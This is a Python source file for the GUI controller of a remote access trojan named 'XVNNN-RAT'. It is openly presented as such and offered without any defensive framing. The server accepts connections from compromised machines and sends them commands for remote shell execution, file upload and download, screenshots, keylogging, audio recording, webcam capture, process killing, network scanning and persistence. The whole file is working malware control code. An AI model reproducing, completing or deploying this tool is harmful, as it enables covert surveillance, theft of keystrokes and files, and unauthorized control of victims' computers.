#!/usr/bin/env python3
"""
XVNNN-RAT GUI Server
Author: Ali Zafar (alizafarbati@gmail.com)
Version: 1.0.0

GUI-based server with full interface.
"""

import socket
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import sys
import os
import base64
from PIL import Image, ImageTk
import io
import logging

# Add src to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.network import send_json, receive_json

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class XVNNNServer:
    """GUI-based server for XVNNN-RAT"""

    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        self.selected_client = None
        self.gui = None
        self.log_text = None
        self.client_listbox = None
        self.client_info_text = None

    def start_server(self):
        """Start the server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            self.log(f"Server started on {self.host}:{self.port}")
            self.log("Waiting for connections...")

            accept_thread = threading.Thread(
                target=self.accept_connections, daemon=True
            )
            accept_thread.start()
        except Exception as e:
            self.log(f"Error starting server: {e}")

    def accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_info = {
                    "socket": client_socket,
                    "addr": addr,
                    "id": len(self.clients) + 1,
                    "hostname": None,
                    "os": None,
                }

                try:
                    send_json(client_socket, {"type": "info"})
                    response = receive_json(client_socket)
                    if response:
                        client_info.update(response)
                except:
                    pass

                self.clients.append(client_info)
                self.log(
                    f"Connection from {addr[0]}:{addr[1]} - ID: {client_info['id']}"
                )
                self.update_client_list()

                client_thread = threading.Thread(
                    target=self.handle_client, args=(client_info,), daemon=True
                )
                client_thread.start()
            except Exception as e:
                if self.running:
                    self.log(f"Accept error: {e}")

    def handle_client(self, client_info):
        """Handle client connection"""
        try:
            while self.running and client_info["socket"] in [
                c["socket"] for c in self.clients
            ]:
                client_info["socket"].recv(1024)
        except:
            pass
        finally:
            if client_info in self.clients:
                self.clients.remove(client_info)
                self.log(f"Client {client_info['id']} disconnected")
                self.update_client_list()

    def send_command(self, client_id, command_type, data=None):
        """Send command to client"""
        client = next((c for c in self.clients if c["id"] == client_id), None)
        if not client:
            self.log(f"Client {client_id} not found")
            return None

        try:
            message = {"type": command_type}
            if data:
                message.update(data)

            send_json(client["socket"], message)

            if command_type in [
                "shell",
                "list_files",
                "download",
                "screenshot",
                "process_list",
                "system_info",
                "network_scan",
                "get_keys",
                "cmd_persist",
            ]:
                return receive_json(client["socket"])
        except Exception as e:
            self.log(f"Error sending command to client {client_id}: {e}")
            if client in self.clients:
                self.clients.remove(client)

        return None

    def log(self, message):
        """Add message to log"""
        if self.gui and self.log_text:
            timestamp = time.strftime("%H:%M:%S")
            self.gui.after(
                0, lambda: self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
            )
            self.gui.after(0, lambda: self.log_text.see(tk.END))

    def update_client_list(self):
        """Update client list"""
        if self.gui and self.client_listbox:
            self.gui.after(0, lambda: self.client_listbox.delete(0, tk.END))
            for client in self.clients:
                display = f"ID: {client['id']} - {client.get('hostname', 'Unknown')} ({client.get('os', 'Unknown')})"
                self.gui.after(
                    0, lambda d=display: self.client_listbox.insert(tk.END, d)
                )

    def build_gui(self):
        """Build GUI"""
        self.gui = tk.Tk()
        self.gui.title("XVNNN-RAT v1.0.0 - Server")
        self.gui.geometry("1000x700")
        self.gui.configure(bg="#1e1e1e")

        # Style
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TFrame", background="#1e1e1e")
        style.configure("TLabel", background="#1e1e1e", foreground="white")
        style.configure("TButton", background="#3c3c3c", foreground="white")

        # Main frame
        main_frame = ttk.Frame(self.gui)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Left panel - Clients
        left_panel = ttk.Frame(main_frame, width=250)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5)

        ttk.Label(
            left_panel, text="Connected Clients", font=("Arial", 12, "bold")
        ).pack(pady=5)

        self.client_listbox = tk.Listbox(
            left_panel, bg="#2a2a2a", fg="white", selectbackground="#007acc", height=15
        )
        self.client_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        self.client_listbox.bind("<<ListboxSelect>>", self.on_client_select)

        self.client_info_text = tk.Text(
            left_panel, height=8, bg="#2a2a2a", fg="#cccccc", font=("Consolas", 9)
        )
        self.client_info_text.pack(fill=tk.X, pady=5)

        # Right panel - Tabs
        right_panel = ttk.Frame(main_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)

        self.notebook = ttk.Notebook(right_panel)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Shell tab
        shell_frame = ttk.Frame(self.notebook)
        self.notebook.add(shell_frame, text="Shell")
        self.build_shell_tab(shell_frame)

        # Files tab
        files_frame = ttk.Frame(self.notebook)
        self.notebook.add(files_frame, text="Files")
        self.build_files_tab(files_frame)

        # Screen tab
        screen_frame = ttk.Frame(self.notebook)
        self.notebook.add(screen_frame, text="Screen")
        self.build_screen_tab(screen_frame)

        # Tools tab
        tools_frame = ttk.Frame(self.notebook)
        self.notebook.add(tools_frame, text="Tools")
        self.build_tools_tab(tools_frame)

        # Log tab
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="Log")
        self.build_log_tab(log_frame)

        # Control bar
        control_frame = ttk.Frame(self.gui)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(control_frame, text="Start Server", command=self.start_server).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(control_frame, text="Stop Server", command=self.stop_server).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Label(control_frame, text=f"Port: {self.port}").pack(side=tk.RIGHT, padx=5)

        self.gui.mainloop()

    def build_shell_tab(self, parent):
        """Build shell tab"""
        self.shell_output = scrolledtext.ScrolledText(
            parent, bg="#000000", fg="#00ff00", font=("Consolas", 10), height=20
        )
        self.shell_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        input_frame = ttk.Frame(parent)
        input_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(input_frame, text="Command:").pack(side=tk.LEFT)
        self.shell_input = ttk.Entry(input_frame)
        self.shell_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.shell_input.bind("<Return>", lambda e: self.execute_shell())

        ttk.Button(input_frame, text="Execute", command=self.execute_shell).pack(
            side=tk.LEFT
        )
        ttk.Button(
            input_frame,
            text="Clear",
            command=lambda: self.shell_output.delete(1.0, tk.END),
        ).pack(side=tk.LEFT)

    def build_files_tab(self, parent):
        """Build files tab"""
        self.file_listbox = tk.Listbox(
            parent, bg="#2a2a2a", fg="white", selectbackground="#007acc"
        )
        self.file_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        control_frame = ttk.Frame(parent)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(control_frame, text="List", command=self.list_files).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(control_frame, text="Upload", command=self.upload_file).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(control_frame, text="Download", command=self.download_file).pack(
            side=tk.LEFT, padx=2
        )

    def build_screen_tab(self, parent):
        """Build screen tab"""
        self.screen_label = tk.Label(parent, bg="#2a2a2a")
        self.screen_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        control_frame = ttk.Frame(parent)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(control_frame, text="Capture", command=self.capture_screen).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(control_frame, text="Save", command=self.save_screen_image).pack(
            side=tk.LEFT, padx=2
        )

    def build_tools_tab(self, parent):
        """Build tools tab"""
        tools_frame = ttk.Frame(parent)
        tools_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # System info
        sys_frame = ttk.LabelFrame(tools_frame, text="System Information")
        sys_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(sys_frame, text="Get Info", command=self.get_system_info).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(sys_frame, text="Get Clipboard", command=self.get_clipboard).pack(
            side=tk.LEFT, padx=2
        )

        # Process
        proc_frame = ttk.LabelFrame(tools_frame, text="Process Management")
        proc_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(proc_frame, text="List Processes", command=self.list_processes).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(proc_frame, text="Kill Process", command=self.kill_process).pack(
            side=tk.LEFT, padx=2
        )

        # Keylogger
        key_frame = ttk.LabelFrame(tools_frame, text="Keylogger")
        key_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(key_frame, text="Start", command=self.start_keylogger).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(key_frame, text="Stop", command=self.stop_keylogger).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(key_frame, text="Get Logs", command=self.get_keylogs).pack(
            side=tk.LEFT, padx=2
        )

        # Network
        net_frame = ttk.LabelFrame(tools_frame, text="Network")
        net_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(net_frame, text="Scan Network", command=self.scan_network).pack(
            side=tk.LEFT, padx=2
        )
        ttk.Button(net_frame, text="Audio Record", command=self.record_audio).pack(
            side=tk.LEFT, padx=2
        )

    def build_log_tab(self, parent):
        """Build log tab"""
        self.log_text = scrolledtext.ScrolledText(
            parent, bg="#1a1a1a", fg="#cccccc", font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def on_client_select(self, event):
        """Handle client selection"""
        selection = self.client_listbox.curselection()
        if selection:
            index = selection[0]
            if index < len(self.clients):
                self.selected_client = self.clients[index]["id"]
                self.update_client_info(self.clients[index])

    def update_client_info(self, client):
        """Update client info display"""
        if self.gui and self.client_info_text:
            self.gui.after(0, lambda: self.client_info_text.delete(1.0, tk.END))
            info = [
                f"ID: {client['id']}",
                f"Hostname: {client.get('hostname', 'Unknown')}",
                f"OS: {client.get('os', 'Unknown')}",
                f"IP: {client['addr'][0]}",
            ]
            for line in info:
                self.gui.after(
                    0, lambda l=line: self.client_info_text.insert(tk.END, l + "\n")
                )

    def execute_shell(self):
        """Execute shell command"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        command = self.shell_input.get()
        if not command:
            return

        self.shell_input.delete(0, tk.END)
        self.log(f"Executing: {command}")

        result = self.send_command(self.selected_client, "shell", {"command": command})
        if result:
            output = result.get("output", "No output")
            self.shell_output.insert(tk.END, f"> {command}\n{output}\n")
            self.shell_output.see(tk.END)

    def list_files(self):
        """List files"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "list_files", {"path": ""})
        if result:
            files = result.get("files", [])
            self.file_listbox.delete(0, tk.END)
            for f in files:
                self.file_listbox.insert(tk.END, f)

    def upload_file(self):
        """Upload file"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        file_path = filedialog.askopenfilename()
        if not file_path:
            return

        try:
            with open(file_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()

            filename = os.path.basename(file_path)
            result = self.send_command(
                self.selected_client,
                "upload",
                {"filename": filename, "data": file_data},
            )

            if result and result.get("status") == "success":
                self.log(f"Uploaded {filename}")
            else:
                self.log(f"Upload failed: {result}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to upload file: {e}")

    def download_file(self):
        """Download file"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        selection = self.file_listbox.curselection()
        if not selection:
            messagebox.showerror("Error", "No file selected")
            return

        filename = self.file_listbox.get(selection[0])
        if "(" in filename:
            filename = filename.split("(")[0].strip()

        save_path = filedialog.asksaveasfilename(
            defaultextension=".bin", initialfile=filename
        )
        if not save_path:
            return

        result = self.send_command(
            self.selected_client, "download", {"filename": filename}
        )

        if result and "data" in result:
            try:
                file_data = base64.b64decode(result["data"])
                with open(save_path, "wb") as f:
                    f.write(file_data)
                self.log(f"Downloaded {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save file: {e}")
        else:
            messagebox.showerror("Error", "Download failed")

    def capture_screen(self):
        """Capture screen"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "screenshot")

        if result and "image" in result:
            try:
                img_data = base64.b64decode(result["image"])
                img = Image.open(io.BytesIO(img_data))
                photo = ImageTk.PhotoImage(img)

                self.screen_label.config(image=photo)
                self.screen_label.image = photo
                self.log("Screen captured")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to display screenshot: {e}")

    def save_screen_image(self):
        """Save current screen image"""
        image = self.screen_label.image
        if not image:
            messagebox.showerror("Error", "No image to save")
            return

        save_path = filedialog.asksaveasfilename(
            defaultextension=".png", filetypes=[("PNG files", "*.png")]
        )
        if save_path:
            try:
                img = ImageTk.getimage(image)
                img.save(save_path)
                self.log(f"Saved image to {save_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save image: {e}")

    def get_system_info(self):
        """Get system info"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "system_info")
        if result and "info" in result:
            self.shell_output.insert(tk.END, "\n=== System Info ===\n")
            for key, value in result["info"].items():
                if key != "disks":
                    self.shell_output.insert(tk.END, f"{key}: {value}\n")
            self.shell_output.see(tk.END)

    def get_clipboard(self):
        """Get clipboard"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        # Note: Clipboard module not implemented in basic version
        messagebox.showinfo("Info", "Clipboard feature requires additional setup")

    def list_processes(self):
        """List processes"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "process_list")
        if result and "processes" in result:
            processes = result["processes"][:20]
            self.shell_output.insert(tk.END, "\n=== Processes ===\n")
            for proc in processes:
                self.shell_output.insert(tk.END, f"{proc['pid']}: {proc['name']}\n")
            self.shell_output.see(tk.END)

    def kill_process(self):
        """Kill process"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        pid_str = simpledialog.askstring("Kill Process", "Enter PID to kill:")
        if not pid_str:
            return

        try:
            pid = int(pid_str)
            result = self.send_command(
                self.selected_client, "process_kill", {"pid": pid}
            )
            if result and result.get("status") == "success":
                self.log(f"Killed process {pid}")
            else:
                messagebox.showerror("Error", "Failed to kill process")
        except:
            messagebox.showerror("Error", "Invalid PID")

    def start_keylogger(self):
        """Start keylogger"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "start_keylogger")
        if result:
            self.log("Keylogger started")

    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "stop_keylogger")
        if result:
            self.log("Keylogger stopped")

    def get_keylogs(self):
        """Get keylogs"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "get_keys")
        if result and "keys" in result:
            self.shell_output.insert(tk.END, f"\n=== Keylogs ===\n{result['keys']}\n")
            self.shell_output.see(tk.END)

    def scan_network(self):
        """Scan network"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "network_scan", {"target": ""})
        if result and "hosts" in result:
            hosts = result["hosts"]
            self.shell_output.insert(
                tk.END, f"\n=== Network Scan: {len(hosts)} hosts ===\n"
            )
            for host in hosts:
                self.shell_output.insert(tk.END, f"  {host}\n")
            self.shell_output.see(tk.END)

    def record_audio(self):
        """Record audio"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        # Ask for duration
        duration = simpledialog.askinteger(
            "Audio Recording", "Enter duration in seconds:", initialvalue=5
        )
        if duration is None:
            return

        result = self.send_command(
            self.selected_client, "record_audio", {"duration": duration}
        )

        if result and "data" in result:
            try:
                # Save audio data to file
                audio_data = bytes.fromhex(result["data"])
                filename = f"audio_{int(time.time())}.wav"

                # For simplicity, we'll save as raw audio data
                # In a real implementation, you'd want to add WAV headers
                with open(filename, "wb") as f:
                    f.write(audio_data)

                self.log(f"Audio recorded and saved as {filename}")
                messagebox.showinfo("Success", f"Audio saved as {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save audio: {e}")
        else:
            error_msg = (
                result.get("error", "Unknown error") if result else "No response"
            )
            messagebox.showerror("Error", f"Failed to record audio: {error_msg}")

    def capture_webcam(self):
        """Capture image from webcam"""
        if not self.selected_client:
            messagebox.showerror("Error", "No client selected")
            return

        result = self.send_command(self.selected_client, "webcam_capture")

        if result and "image_data" in result:
            try:
                img_data = base64.b64decode(result["image_data"])
                img = Image.open(io.BytesIO(img_data))
                photo = ImageTk.PhotoImage(img)

                self.screen_label.config(image=photo)
                self.screen_label.image = photo
                self.log("Webcam image captured")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to display webcam image: {e}")
        else:
            error_msg = (
                result.get("error", "Unknown error") if result else "No response"
            )
            messagebox.showerror("Error", f"Failed to capture webcam: {error_msg}")

    def stop_server(self):
        """Stop server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        self.log("Server stopped")

    def run(self):
        """Run server"""
        self.build_gui()


if __name__ == "__main__":
    server = XVNNNServer()
    server.run()
